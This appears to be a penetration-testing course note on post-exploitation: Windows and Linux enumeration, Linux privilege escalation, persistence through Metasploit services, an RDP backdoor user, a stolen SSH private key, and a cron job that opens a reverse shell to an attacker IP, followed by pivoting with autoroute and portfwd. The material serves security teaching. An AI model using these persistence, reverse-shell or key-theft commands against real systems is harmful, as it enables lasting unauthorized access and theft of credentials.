--- 

- In order to perform a thorough and complete post-exploitation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagements.

- This structured, methodological approach ensures that we do not skipfoverlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

![[Pasted image 20230713160940.png]]

## Windows Local Enumeration

### System Information

+ Hostname 
```powershell
hostname
```

+ OS Name (Windows 7, 8, etc.), Build, Service Pack and Architecture  
```powershell
systeminfo

wnic qfe get Caption,Description,HotFixID,InstalledOn

type C:\Windows\System32\eula.txt
```


### Enumerating Users & Groups

+ Current user & privileges 
+ Additional user information 
+ Other users on the system 
+ Groups 
+ Members of the built-in administrator group

```powershell
whoami /all

query user # List loged on users

net users # List all users on a machine

net user User # List info. about a spacific user

net localgroup

```


### Enumerating Network Information 

+ Current IP address & network adapter 
+ Internal networks 
+ TCP/UDP services running and their respective ports 
+ Other hosts on the network 
+ Routing table 
+ Windows Firewall state

```PowerShell
ipconfig /all

route print # Print routing table

arp -a # All devices connected to a network

netstat -nao # All ports

netsh firewall dump # Firewall state (Old OS)

netsh advfirewall show show allprofiles # Firewall state

```

### Enumerating Processes & Services 
+ Running processes & services 
+ Scheduled tasks 

+ A ==process== is an instance of a running executable (.exe) or program. 

+ A ==service== is a process which runs in the background and does not interact with the desktop. 
```powershell
ps

pgrep SERVICE.EXE # Get process id

net start # List services

wmic service list brief 

tasklist /SVC # List of processes

schtasks /query /fo LIST /v
```

### Automating Windows Local Enumeration

```powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.psl -OutputFilename JAWS-Enum.txt
```

[JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)

```bash
msf > exploit/windows/winrm/winrm_script_exec 
```

>*Read More:
   [[08 - Windows & Linux Post Exploitation Using MSF]]*


## Linux Local Enumeration

> Read More:
> [[08 - Windows & Linux Post Exploitation Using MSF]]
> [[07 - Linux Privilege Escalation]]
> [[Linux Privilege Escalation for Beginners]]

### Enumerating Processes & Cron Jobs

- Running services
- Cron Jobs

```bash
ps aux

top # dynamic utility

crontab -l 

ls -la /etc/cron*
```

###  Automating Linux Local Enumeration 

- [LinEnum](https://github.com/rebootuser/LinEnum) - LinEnum is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.


## Linux Privilege Escalation

### Weak Permissions

```bash
whoami
group 
cat /etc/group
cat /etc/passwd
find / -not type l -perm -o+w
openssl passwd -1 -salt abc password  
```

### Sudo Privileges
```bash
sudo -l 
sudo man man
!/bin/sh
```

## Windows Persistence

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. - MITRE ATT&CK Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

### Persistence Via Services 
```sh
msf > exploit/windows/local/persistence_service
```

![[Pasted image 20230714035825.png]]


### Persistence Via RDP
```sh
meterpreter > run getgui -e -u alexis -p hacker_luszm
```

![[Pasted image 20230714043529.png]]


## Linux Persistence

### Persistence Via SSH Keys

Linux is typically deployed as a server operating system and as a result. Linux's servers are typically accessed remotely via services/protocols such as SSH. 

If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the  SSH configuration to establish persistent access on the target system.

In most cases Linux servers will have **key-based authentication** enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password. 

After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access. XIG

```sh
scp student@192.63.238.3:~/.ssh/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa student@192.63.238.3
```

### Persistence Via Cron Jobs

Linux implements task scheduling through a utility called **Cron**. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule. 

An application, or script that has been configured to be run repeatedly with Cron is known as a **Cron job**.

We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

```bash
cat /etc/cron*
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.166.95.2/1234 &>81'" > cjob
crontab -i cjob
nc -lvnp 1234
```

## Pivoting

Pivoting is the unique technique of using an instance (also referred to as a ‘plant’ or ‘foothold’) to be able to move around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems. In this scenario we will be using it for routing traffic from a normally non-routable network.

```bash
meterpreter > run autoroute -h
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > run autoroute -p
meterpreter >
msf > use auxiliary/scanner/portscan/tcp 
msf auxiliary(tcp) > set RHOSTS 10.1.13.0/24
msf auxiliary(tcp) > set PORTS 139,445
msf auxiliary(tcp) > set THREADS 50
msf auxiliary(tcp) > run
```


## Portfwd

The portfwd command from within the Meterpreter shell is most commonly used as a pivoting technique, allowing direct access to machines otherwise inaccessible from the attacking system. Running this command on a compromised host with access to both the attacker and destination network (or system), we can essentially forward TCP connections through this machine, effectively making it a pivot point. Much like the port forwarding technique used with an ssh connection, portfwd will relay TCP connections to and from the connected machines.

```bash
meterpreter > portfwd -h

```

- -L: Use to specify the listening host. Unless you need the forwarding to occur on a specific network adapter you can omit this option. If none is entered 0.0.0.0 will be used.
- -h: Displays the above information.
- -l: This is a local port which will listen on the attacking machine. Connections to this port will be forwarded to the remote system.
- -p: The port to which TCP connections will be forward to.
- -r: The IP address the connections are relayed to (target).

```
meterpreter > portfwd add –l 3389 –p 3389 –r  [target host]
meterpreter > portfwd delete –l 3389 –p 3389 –r [target host]
meterpreter > portfwd list
meterpreter > portfwd flush
```

#metasploit #network_security #port_forwarding

## Clearing Your Tracks On Windows

- The exploitation and post-exploitation phases of a penetration test involves actively engaging with target systems and the data that is stored on these systems. 

- As a result, you may be required to clear/undo any changes you have made to the target systems you have compromised based on the guidelines specified in the rules of engagement.

- If you have transferred any files to the target systems you have compromised, keep track of where they have been saved so that you can remove them when done.

- A good practice is to store all your scripts, exploits and binaries in the `C:/Temp` directory on Windows and the `/tmp` directory on Linux

- It is also important to consider the exploitation framework you are using, an example of this is MSF, which is notorious for generating and storing artifacts on the target system when using exploit or post modules. 

- Some well designed MSF modules provide you with instructions and resource scripts that provide you with information regarding where the artifacts are stored and how they can be removed. 

- In the context of Windows, a typical post-exploitation technique pertinent to clearing your tracks is to delete the Windows Event Log. This is something that should be avoided during a penetration test as the Windows Event Log stores a lot of data.

